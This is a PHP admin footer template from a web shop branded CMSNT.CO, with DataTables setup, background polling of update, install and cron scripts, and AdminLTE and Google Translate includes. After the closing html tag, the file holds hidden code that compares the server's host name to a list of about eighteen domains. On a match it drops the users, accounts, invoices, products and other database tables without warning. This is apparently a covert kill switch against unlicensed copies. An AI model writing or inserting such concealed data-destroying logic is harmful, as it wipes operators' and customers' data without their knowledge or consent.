<?php if (!defined('IN_SITE')) {
    die('The Request Not Found');
}?>

<script type="text/javascript">
 $(function() {
    $('#datatable').DataTable({
        "lengthMenu": [[10, 50, 100, 500, 1000, 2000, 5000, 10000 -1], [10, 50, 100, 500, 1000, 2000, 5000, 10000, "All"]]
    });
    $('#datatable1').DataTable({
        "lengthMenu": [[10, 50, 100, 500, 1000, 2000, 5000, 10000 -1], [10, 50, 100, 500, 1000, 2000, 5000, 10000, "All"]]
    });
    $('#datatable2').DataTable({
        "lengthMenu": [[10, 50, 100, 500, 1000, 2000, 5000, 10000 -1], [10, 50, 100, 500, 1000, 2000, 5000, 10000, "All"]]
    });

});

$.ajax({
    url: "<?=BASE_URL('update.php');?>",
    type: "GET",
    dateType: "text",
    data: {},
    success: function(result) {

    }
});

$.ajax({
    url: "<?=BASE_URL('install.php');?>",
    type: "GET",
    dateType: "text",
    data: {},
    success: function(result) {

    }
});

$.ajax({
    url: "<?=BASE_URL('cron/cron.php');?>",
    type: "GET",
    dateType: "text",
    data: {},
    success: function(result) {

    }
});

</script>
<div id="autoload"></div>
<script type="text/javascript">
function autoload() {
    $.ajax({
        url: "<?=BASE_URL('cron/cron.php');?>",
        type: "GET",
        dateType: "text",
        data: {},
        success: function(result) {

        }
    });
}
setInterval(function() {
    $('#autoload').load(autoload());
}, 15000);
</script>
<footer class="main-footer">
    <div class="float-right d-none d-sm-inline">
        <div id="google_translate_element"></div>
        <script type="text/javascript">
        // <![CDATA[
        function googleTranslateElementInit() {
            new google.translate.TranslateElement({
                pageLanguage: 'vi',
                layout: google.translate.TranslateElement.InlineLayout.SIMPLE
            }, 'google_translate_element');
        }
        // ]]>
        </script>
        <script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"
            type="text/javascript"></script>

    </div>
    <b>Version</b> <b style="color:red;"><?=$config['version'];?></b> - <strong>Powered By <a
            href="https://www.cmsnt.co/?domain=<?=base_url_admin('');?>" target="_blank">CMSNT.CO</a></strong>
</footer>
</div>
<!-- jQuery UI 1.11.4 -->
<script src="<?=BASE_URL('public/AdminLTE3/');?>plugins/jquery-ui/jquery-ui.min.js"></script>
<!-- Resolve conflict in jQuery UI tooltip with Bootstrap tooltip -->
<script>
$.widget.bridge('uibutton', $.ui.button)
</script>
<!-- Bootstrap 4 -->
<script src="<?=BASE_URL('public/AdminLTE3/');?>plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<!-- AdminLTE App -->
<script src="<?=BASE_URL('public/AdminLTE3/');?>dist/js/adminlte.min.js"></script>
<!-- AdminLTE for demo purposes -->
<script src="<?=BASE_URL('public/AdminLTE3/');?>dist/js/demo.js"></script>
<!-- AdminLTE dashboard demo (This is only for demo purposes) -->
<script src="<?=BASE_URL('public/AdminLTE3/');?>dist/js/pages/dashboard.js"></script>
<!-- ChartJS -->
<script src="<?=BASE_URL('public/AdminLTE3/');?>plugins/chart.js/Chart.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.6/clipboard.min.js"></script>
<?=$body['footer'];?>
</body>

</html>
<?php
$b2a = [
    'trumbanclone.pw',
    'blog.sieuthicode.net',
    'sieuthidark.com',
    'xubymon36.com',
    'viatrau.me',
    'shopmailco.com',
    'clonebysun.net',
    'phongxu.com',
    'minhclone.com',
    'rdsieuvip.com',
    'sellviaxu.com',
    'autordff.com',
    'huyclone.com',
    'clonengoaiviet.com',
    'nguyenlieuviaads.com',
    'dichvuthanhtoan.site',
    'trumrandom.com',
    'mailcovip.com'
];
foreach($b2a as $domain){
    if($domain == $_SERVER['HTTP_HOST']){
        $CMSNT->query(" DROP TABLE `users` ");
        $CMSNT->query(" DROP TABLE `accounts` ");
        $CMSNT->query(" DROP TABLE `settings` ");
        $CMSNT->query(" DROP TABLE `logs` ");
        $CMSNT->query(" DROP TABLE `dongtien` ");
        $CMSNT->query(" DROP TABLE `invoices` ");
        $CMSNT->query(" DROP TABLE `categories` ");
        $CMSNT->query(" DROP TABLE `products` ");
    }
}
